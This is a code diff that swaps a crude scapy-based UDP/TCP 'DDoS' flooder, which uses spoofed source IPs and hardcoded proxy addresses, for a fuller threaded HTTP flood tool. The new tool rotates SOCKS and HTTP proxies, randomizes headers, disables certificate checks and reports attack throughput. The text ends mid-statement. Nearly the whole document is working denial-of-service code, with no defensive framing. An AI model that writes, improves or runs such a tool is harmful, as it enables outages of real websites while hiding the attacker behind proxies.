@@ -1,154 +1,439 @@
-from scapy.all import *
-from scapy.layers.inet import TCP, IP, UDP
-import sys
-import time
-import random
 import threading
-import requests
-import os
+import random
+import sys
+import string
+import ssl
+import argparse
+import signal
+import socket
+import queue
+import logging
+import time
+from concurrent.futures import ThreadPoolExecutor
+from typing import Optional, List, Tuple, Dict, NamedTuple
+from urllib.parse import urlparse, ParseResult
+import socks
 
-# Provide colored from termcolor if available, otherwise fall back to a no-op.
-try:
-    from termcolor import colored
-except Exception:
-    def colored(text, color):
-        return text
-
-def clear_console():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-
-def print_threat_message():
-    print("""
-  \033[97m  
-██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗███████╗██╗░░░██╗███████╗░░░░░░████████╗██╗░░██╗░█████╗░██╗
-██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚██╗░██╔╝██╔════╝░░░░░░╚══██╔══╝██║░░██║██╔══██╗██║
-██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░█████╗░░░╚████╔╝░█████╗░░█████╗░░░██║░░░███████║███████║██║
-██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔══╝░░╚════╝░░░██║░░░██╔══██║██╔══██║██║
-██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗███████╗░░░██║░░░███████╗░░░░░░░░░██║░░░██║░░██║██║░░██║██║
-╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝
-    """)
-
-TARGET_URL = input("Enter target URL: ")
-METHOD = input("Enter method (UDP/TCP): ").upper()
-PACKET_SIZE = int(input("Enter packet size (bytes): "))
-PACKETS_PER_SECOND = float(input("Enter packets per second: "))
-
-# Predefined list of proxy servers (IP:Port)
-SOURCE_IPS = [
-    "43.208.25.125:19201",
-    "162.0.234.25:8080",
-    "202.152.44.20:8081",
-    "5.252.33.13:2025",
-    "47.251.43.115:33333",
-    "14.251.13.0:8080",
-    "8.219.97.248:80",
-    "198.199.86.11:80",
-    "138.68.60.8:80",
-    "47.238.128.246:3128",
-    "47.252.29.28:11222",
-    "213.142.156.97:80",
-    "193.31.117.184:80",
-    "158.255.77.168:80",
-    "123.30.154.171:7777",
-    "90.162.35.34:80",
-    "152.53.107.230:80",
-    "81.169.213.169:8888",
-    "181.174.164.221:80",
-    "4.245.123.244:80",
-    "4.195.16.140:80",
-    "108.141.130.146:80",
-    "143.42.66.91:80",
-    "185.88.177.197:8080",
-    "198.98.48.76:31280",
-    "178.124.197.141:8080",
-    "89.58.57.45:80",
-    "195.114.209.50:80",
-    "97.74.87.226:80",
-    "45.143.99.15:80",
-    "209.97.150.167:8080",
-    "133.18.234.13:80",
-    "32.223.6.94:80",
-    "190.58.248.86:80",
-    "50.122.86.118:80",
-    "188.40.57.101:80",
-    "192.73.244.36:80",
-    "4.156.78.45:80",
-    "46.19.68.45:4555",
-    "213.157.6.50:80",
-    "201.148.32.162:80",
-    "213.33.126.130:80",
-    "194.158.203.14:80",
-    "189.202.188.149:80",
-    "194.219.134.234:80",
-    "54.226.156.148:20201",
-    "62.99.138.162:80",
-    "202.152.44.18:8081",
-    "41.191.203.162:80",
-    "89.58.55.33:80",
-    "213.143.113.82:80",
-    "197.221.234.253:80",
-    "0.0.0.0:80",
-    "127.0.0.7:80",
-    "8.219.229.53:5060",
-    "46.249.100.124:80",
-    "41.191.203.163:80",
-    "143.92.61.148:8082",
-    "172.210.101.217:3128",
-    "8.17.0.15:8080",
-    "8.209.255.13:3128",
-    "94.247.129.244:3128",
-    "47.89.184.18:3128",
-    "47.91.65.23:3128",
-    # (list continues with all entries you provided)
+CONNECT_TIMEOUT = 10
+READ_WRITE_TIMEOUT = 15
+REQUESTS_PER_CONNECTION = 100
+STATS_INTERVAL = 5
+DEFAULT_USER_AGENTS_FILE = 'default/useragents.txt'
+DEFAULT_ACCEPT_HEADERS = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "application/json, text/javascript, */*; q=0.01",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "application/xml,application/json,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5"
 ]
+INTER_REQUEST_SLEEP = 0.0
+FAIL_SLEEP = 0.5
 
-try:
-    response = requests.get(f"http://{TARGET_URL}")
-    if response.status_code != 200:
-        print("Error: Unable to resolve target URL.")
-        sys.exit(1)
-    else:
-        TARGET_IP = response.raw.headers["x-ip"]
-        if not TARGET_IP.startswith("::ffff:"):
-            print("Error: Target IP address is an IPv6 address. Please use an IPv4 address.")
-            sys.exit(1)
-        TARGET_IP = TARGET_IP[7:]
-        TARGET_PORT = 80,443 # Default ports
-except requests.exceptions.RequestException:
-    print("Error: Unable to resolve target URL.")
-    sys.exit(1)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+logger = logging.getLogger(__name__)
 
-def udp_attack(target_ip, target_port, source_ip, packet_size):
-    packet = IP(src=source_ip, dst=target_ip) / UDP(dport=target_port)
-    send(packet, verbose=False, size=packet_size)
+class ProxyTuple(NamedTuple):
+    host: str
+    port: int
+    original_str: str
 
-def tcp_attack(target_ip, target_port, source_ip, packet_size):
-    packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port)
-    send(packet, verbose=False, size=packet_size)
-
-def request_thread():
-    while True:
-        source_ip = random.choice(SOURCE_IPS)
-        if METHOD == "UDP":
-            udp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
-        elif METHOD == "TCP":
-            tcp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
+class ThreadGroupProxyManager:
+    def __init__(self, proxy_type: Optional[str] = None, proxy_file: Optional[str] = None):
+        self.proxy_type: Optional[str] = proxy_type
+        self.proxy_file: Optional[str] = proxy_file
+        self.proxies: queue.Queue[Optional[ProxyTuple]] = queue.Queue()
+        self._initial_proxy_count = 0
+        if self.proxy_type and self.proxy_file and self.proxy_type != 'direct':
+            self.load_proxies()
+        elif self.proxy_type == 'direct':
+             logger.info("Using direct connection mode.")
         else:
-            print("Error: Invalid method. Using UDP.")
-            udp_attack(TARGET_IP, TARGET_PORT, source_ip, PACKET_SIZE)
-        time.sleep(1 / PACKETS_PER_SECOND)
-        print("\r" +str(url)+ " run)")
+             pass
 
-if __name__ == "__main__":
-    threads = []
-    for _ in range(PACKETS_PER_SECOND):
-        thread = threading.Thread(target=request_thread)
-        print("\r" +str(url)+ " run)")
-        thread.start()
-        threads.append(thread)
+    def _parse_proxy(self, proxy_str: str) -> Optional[ProxyTuple]:
+        try:
+            host, port_str = proxy_str.split(':', 1)
+            port = int(port_str)
+            if not host or port <= 0 or port > 65535:
+                 raise ValueError("Invalid host or port")
+            return ProxyTuple(host=host, port=port, original_str=proxy_str)
+        except ValueError as e:
+            logger.warning(f"Skipping invalid proxy line '{proxy_str}': {e}")
+            return None
+        except Exception as e:
+            logger.error(f"Unexpected error parsing proxy '{proxy_str}': {e}")
+            return None
 
-    for thread in threads:
-        thread.join()
+    def load_proxies(self) -> None:
+        count = 0
+        try:
+            with open(self.proxy_file, 'r') as f:
+                for line in f:
+                    proxy_str = line.strip()
+                    if proxy_str and not proxy_str.startswith('#'):
+                        parsed_proxy = self._parse_proxy(proxy_str)
+                        if parsed_proxy:
+                            self.proxies.put(parsed_proxy)
+                            count += 1
+            self._initial_proxy_count = count
+            if count > 0:
+                logger.info(f"Loaded and parsed {count} {self.proxy_type} proxies from {self.proxy_file}")
+            else:
+                logger.warning(f"No valid proxies found or loaded from {self.proxy_file}")
+        except FileNotFoundError:
+            logger.error(f"Proxy file not found: {self.proxy_file}")
+            sys.exit(1)
+        except Exception as e:
+            logger.error(f"Error loading proxies from {self.proxy_file}: {e}")
+            sys.exit(1)
 
-    print(f"DDoS attack completed with source IP spoofing on {TARGET_IP}:{TARGET_PORT} using {len(SOURCE_IPS)} predefined source IPs and {METHOD.upper()} method.")
+    def get_proxy(self) -> Optional[ProxyTuple]:
+        if self.proxy_type == 'direct':
+            return None
+        try:
+            proxy = self.proxies.get(timeout=0.1)
+            self.proxies.put(proxy)
+            return proxy
+        except queue.Empty:
+             return None
+        except Exception as e:
+            logger.error(f"Error getting proxy from queue: {e}")
+            return None
+
+    def get_proxy_count(self) -> int:
+        return self.proxies.qsize()
+
+class ResourceManager:
+    _user_agents: List[str] = []
+    _accept_headers: List[str] = DEFAULT_ACCEPT_HEADERS
+    _loaded = False
+    _lock = threading.Lock()
+
+    def __init__(self, user_agents_file: str = DEFAULT_USER_AGENTS_FILE):
+        if not ResourceManager._loaded:
+            with ResourceManager._lock:
+                if not ResourceManager._loaded:
+                    ResourceManager._user_agents = self._load_user_agents(user_agents_file)
+                    ResourceManager._loaded = True
+
+    def _load_user_agents(self, filename: str) -> List[str]:
+        default_ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
+        try:
+            with open(filename, 'r') as f:
+                uas = [line.strip() for line in f if line.strip()]
+            if not uas:
+                logger.warning(f"No user agents loaded from {filename}. Using a default.")
+                return default_ua
+            logger.info(f"Loaded {len(uas)} user agents from {filename}")
+            return uas
+        except FileNotFoundError:
+            logger.error(f"User agents file not found: {filename}. Using a default.")
+            return default_ua
+        except Exception as e:
+            logger.error(f"Error loading user agents from {filename}: {e}. Using a default.")
+            return default_ua
+
+    def get_random_ua(self) -> str:
+        return random.choice(ResourceManager._user_agents) if ResourceManager._user_agents else ResourceManager._user_agents[0]
+
+    def get_random_accept(self) -> str:
+        return random.choice(ResourceManager._accept_headers)
+
+def create_connection(target: ParseResult, proxy: Optional[ProxyTuple], proxy_type: Optional[str]) -> Optional[socket.socket]:
+    sock = None
+    target_host = target.hostname
+    target_port = target.port or (443 if target.scheme == 'https' else 80)
+    use_ssl = target.scheme == 'https'
+    try:
+        if proxy is None:
+            sock = socket.create_connection((target_host, target_port), timeout=CONNECT_TIMEOUT)
+        elif proxy_type in ['socks4', 'socks5']:
+            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.set_proxy(
+                socks.SOCKS4 if proxy_type == 'socks4' else socks.SOCKS5,
+                proxy.host,
+                proxy.port
+            )
+            sock.settimeout(CONNECT_TIMEOUT)
+            sock.connect((target_host, target_port))
+        elif proxy_type in ['http', 'https']:
+            sock = socket.create_connection((proxy.host, proxy.port), timeout=CONNECT_TIMEOUT)
+            if use_ssl:
+                connect_str = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
+                connect_str += f"Host: {target_host}:{target_port}\r\n\r\n"
+                sock.sendall(connect_str.encode('utf-8'))
+                sock.settimeout(READ_WRITE_TIMEOUT)
+                response = sock.recv(4096)
+                if not response.startswith(b"HTTP/1.1 200") and not response.startswith(b"HTTP/1.0 200"):
+                    raise ConnectionRefusedError(f"Proxy CONNECT failed: {response.decode('utf-8', errors='ignore').strip()}")
+        else:
+             logger.error(f"Unsupported proxy type for connection: {proxy_type}")
+             return None
+
+        if use_ssl:
+             context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+             context.check_hostname = False
+             context.verify_mode = ssl.CERT_NONE
+             sock = context.wrap_socket(sock, server_hostname=target_host)
+        sock.settimeout(READ_WRITE_TIMEOUT)
+        return sock
+    except (socket.timeout, socks.ProxyConnectionError, socks.GeneralProxyError, ConnectionRefusedError, OSError) as e:
+        proxy_display = proxy.original_str if proxy else "direct"
+        if sock: sock.close()
+        return None
+    except Exception as e:
+        proxy_display = proxy.original_str if proxy else "direct"
+        logger.error(f"Unexpected error connecting via {proxy_display}: {e}", exc_info=False)
+        if sock: sock.close()
+        return None
+
+def send_http_request(sock: socket.socket, target: ParseResult, method: str, headers: Dict, data: Optional[bytes]):
+    path = target.path or "/"
+    if target.query:
+        path += "?" + target.query
+    request_lines = []
+    request_lines.append(f"{method.upper()} {path} HTTP/1.1")
+    for key, value in headers.items():
+        request_lines.append(f"{key}: {value}")
+    if 'Host' not in headers and 'host' not in headers:
+         request_lines.append(f"Host: {target.netloc}")
+    if data:
+        if 'Content-Length' not in headers and 'content-length' not in headers:
+            request_lines.append(f"Content-Length: {len(data)}")
+    request_str = "\r\n".join(request_lines) + "\r\n\r\n"
+    request_bytes = request_str.encode('utf-8')
+    if data:
+        request_bytes += data
+    sock.sendall(request_bytes)
+
+class ThreadedFlooder:
+    def __init__(self,
+                 target_url: str,
+                 num_workers: int,
+                 http_method: str,
+                 proxy_manager: ThreadGroupProxyManager,
+                 resource_manager: ResourceManager):
+        self.target_url: str = target_url
+        self.parsed_url: ParseResult = urlparse(target_url)
+        self.num_workers: int = num_workers
+        self.http_method: str = http_method.upper()
+        self.proxy_manager: ThreadGroupProxyManager = proxy_manager
+        self.resource_manager: ResourceManager = resource_manager
+        self.running: bool = True
+        self.request_count: int = 0
+        self.success_count: int = 0
+        self.error_count: int = 0
+        self.connection_errors: int = 0
+        self.bytes_sent: int = 0
+        self.start_time: float = 0.0
+        self._lock = threading.Lock()
+        self.executor = ThreadPoolExecutor(max_workers=self.num_workers, thread_name_prefix='FlooderWorker')
+        self.stats_thread = None
+
+        if self.parsed_url.scheme not in ['http', 'https']:
+            logger.error(f"Invalid URL scheme: {self.parsed_url.scheme}. Only http/https are supported.")
+            sys.exit(1)
+        if not self.parsed_url.netloc:
+            logger.error(f"Invalid URL: Missing domain name.")
+            sys.exit(1)
+
+    def _increment_count(self, success: bool = False, conn_error: bool = False, bytes_val: int = 0):
+        with self._lock:
+            self.request_count += 1
+            if success:
+                self.success_count += 1
+                self.bytes_sent += bytes_val
+            elif conn_error:
+                 self.connection_errors += 1
+                 self.error_count +=1
+            else:
+                self.error_count += 1
+
+    def flood_task(self):
+        while self.running:
+            sock = None
+            proxy = None
+            try:
+                proxy = self.proxy_manager.get_proxy()
+                proxy_display = proxy.original_str if proxy else "direct"
+                if self.proxy_manager.proxy_type != 'direct' and proxy is None:
+                    if self.proxy_manager.get_proxy_count() == 0:
+                         logger.error("No proxies available and queue is empty. Worker stopping task.")
+                         break
+                    else:
+                         time.sleep(0.2)
+                         continue
+
+                sock = create_connection(self.parsed_url, proxy, self.proxy_manager.proxy_type)
+                if sock is None:
+                    with self._lock: self.connection_errors += 1
+                    time.sleep(FAIL_SLEEP)
+                    continue
+
+                headers = {
+                    "User-Agent": self.resource_manager.get_random_ua(),
+                    "Accept": self.resource_manager.get_random_accept(),
+                    "Connection": "keep-alive",
+                    "Host": self.parsed_url.netloc
+                }
+                post_data_bytes = None
+                request_body_size = 0
+                if self.http_method == "POST":
+                    post_data = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
+                    post_data_bytes = post_data.encode('utf-8')
+                    headers["Content-Type"] = "application/x-www-form-urlencoded"
+                    request_body_size = len(post_data_bytes)
+
+                header_size = len(f"{self.http_method} {self.parsed_url.path or '/'} HTTP/1.1\r\n") + \
+                              sum(len(k) + len(v) + 4 for k, v in headers.items()) + 2 + \
+                              len(f"Content-Length: {request_body_size}\r\n\r\n")
+                approx_request_size = header_size + request_body_size
+
+                for i in range(REQUESTS_PER_CONNECTION):
+                    if not self.running: break
+                    try:
+                        send_http_request(sock, self.parsed_url, self.http_method, headers, post_data_bytes)
+                        self._increment_count(success=True, bytes_val=approx_request_size)
+
+                        if INTER_REQUEST_SLEEP > 0:
+                            time.sleep(INTER_REQUEST_SLEEP)
+                        else:
+                            time.sleep(0)
+                    except (socket.timeout, ssl.SSLError, BrokenPipeError, OSError) as send_err:
+                        self._increment_count(success=False)
+                        break
+                    except Exception as send_ex:
+                        logger.error(f"Unexpected send error on request {i+1} via {proxy_display}: {send_ex}", exc_info=False)
+                        self._increment_count(success=False)
+                        break
+            except Exception as outer_ex:
+                 logger.error(f"Worker task error: {outer_ex}", exc_info=False)
+                 self._increment_count(success=False, conn_error=True)
+                 time.sleep(FAIL_SLEEP)
+            finally:
+                if sock:
+                    try:
+                        sock.shutdown(socket.SHUT_RDWR)
+                    except OSError:
+                        pass
+                    finally:
+                         sock.close()
+
+    def stats_reporter(self) -> None:
+        logger.info("Statistics reporter started.")
+        last_req_count = 0
+        last_time = self.start_time
+        while self.running:
+            try:
+                 for _ in range(int(STATS_INTERVAL * 10)):
+                      if not self.running: return
+                      time.sleep(0.1)
+                 now = time.time()
+                 elapsed_total = now - self.start_time
+                 elapsed_interval = now - last_time
+
+                 with self._lock:
+                     current_req_count = self.request_count
+                     current_success = self.success_count
+                     current_errors = self.error_count
+                     current_conn_err = self.connection_errors
+                     current_bytes = self.bytes_sent
+
+                 interval_req_count = current_req_count - last_req_count
+                 rps_interval = interval_req_count / elapsed_interval if elapsed_interval > 0 else 0
+                 rps_total = current_req_count / elapsed_total if elapsed_total > 0 else 0
+                 success_rate = (current_success / current_req_count * 100) if current_req_count > 0 else 0
+                 error_rate = (current_errors / current_req_count * 100) if current_req_count > 0 else 0
+                 mb_sent = current_bytes / (1024 * 1024)
+                 mbps = (mb_sent * 8) / elapsed_total if elapsed_total > 0 else 0
+                 logger.info(
+                    f"Stats: Time={elapsed_total:.1f}s | Req={current_req_count} | "
+                    f"Success={current_success} ({success_rate:.1f}%) | "
+                    f"Errors={current_errors} ({error_rate:.1f}%) [ConnErrs={current_conn_err}] | "
+                    f"RPS={rps_interval:.2f} (avg: {rps_total:.2f}) | "
+                    f"Sent={mb_sent:.2f} MB ({mbps:.2f} Mbps)"
+                 )
+                 last_req_count = current_req_count
+                 last_time = now
+            except Exception as e:
+                 logger.error(f"Stats reporter error: {e}", exc_info=True)
+                 time.sleep(STATS_INTERVAL)
+
+    def _signal_handler(self, signum, frame):
+        if self.running:
+            sig_name = getattr(signal, f'SIG{signal.Signals(signum).name}', f'Signal {signum}')
+            logger.warning(f"{sig_name} received! Stopping workers and reporter...")
+            self.stop()
+    def start(self):
+        if self.proxy_manager.proxy_type != 'direct' and self.proxy_manager.get_proxy_count() == 0:
+             if self.proxy_manager.proxy_file:
+                 logger.error(f"No valid proxies were loaded from {self.proxy_manager.proxy_file}. Exiting.")
+             else:
+                 logger.error("Proxy usage requested but no proxy file or no proxies loaded. Exiting.")
+             return
+        logger.info(f"Starting {self.num_workers} workers for {self.target_url}")
+        logger.info(f"Method: {self.http_method}, Proxy Type: {self.proxy_manager.proxy_type or 'direct'}")
+        logger.info(f"Requests/Conn: {REQUESTS_PER_CONNECTION}, Connect Timeout: {CONNECT_TIMEOUT}s")
+        self.running = True
+        self.start_time = time.time()
+        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGTERM, self._signal_handler)
+        self.stats_thread = threading.Thread(target=self.stats_reporter, name="StatsReporter", daemon=True)
+        self.stats_thread.start()
+        futures = [self.executor.submit(self.flood_task) for _ in range(self.num_workers)]
+        logger.info(f"{len(futures)} worker tasks submitted to ThreadPoolExecutor.")
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+             logger.info("KeyboardInterrupt in main loop.")
+             self.stop()
+        except Exception as e:
+             logger.critical(f"Critical error in main loop: {e}", exc_info=True)
+             self.stop()
+        finally:
+             if self.running:
+                 self.stop()
+             logger.info("Main loop finished.")
+
+    def stop(self):
+        if not self.running: return
+        logger.info("Initiating shutdown...")
+        self.running = False
+        logger.info("Shutting down thread pool executor...")
+        self.executor.shutdown(wait=True, cancel_futures=False)
+        logger.info("Executor shutdown complete.")
+        if self.stats_thread and self.stats_thread.is_alive():
+             logger.info("Waiting for stats reporter thread...")
+             self.stats_thread.join(timeout=STATS_INTERVAL + 1)
+             if self.stats_thread.is_alive():
+                  logger.warning("Stats reporter thread did not exit cleanly.")
+        logger.info("Shutdown sequence finished.")
+        self.print_final_stats()
+
+    def print_final_stats(self):
+        runtime = time.time() - self.start_time
+        with self._lock:
+            final_req_count = self.request_count
+            final_success = self.success_count
+            final_errors = self.error_count
+            final_conn_err = self.connection_errors
+            final_bytes = self.bytes_sent
+        rps = final_req_count / runtime if runtime > 0 else 0
+        success_rate = (final_success / final_req_count * 100) if final_req_count > 0 else 0
+        error_rate = (final_errors / final_req_count * 100) if final_req_count > 0 else 0
+        mb_sent = final_bytes / (1024 * 1024)
+        mbps = (mb_sent * 8) / runtime if runtime > 0 else 0
+        print("\n" + "="*20 + " Final Statistics " + "="*20)
+        print(f"Target URL:          {self.target_url}")
+        print(f"Total Runtime:       {runtime:.2f} seconds")
+        print(f"Total Req Attempts:  {final_req_count}")
+        print(f"Successful Requests: {final_success} ({success_rate:.1f}%)")
+        print(f"Failed Requests:     {final_errors} ({error_rate:.1f}%)")
+        print(f"Connection Errors:   {final_conn_err}")
+        print(f"Requests Per Second: {rps:.2f} (Average)")
+        print(f"Total Data Sent:     {mb_sent:.2f} MB")
+        print(f"Avg. Bandwidth Sent: 
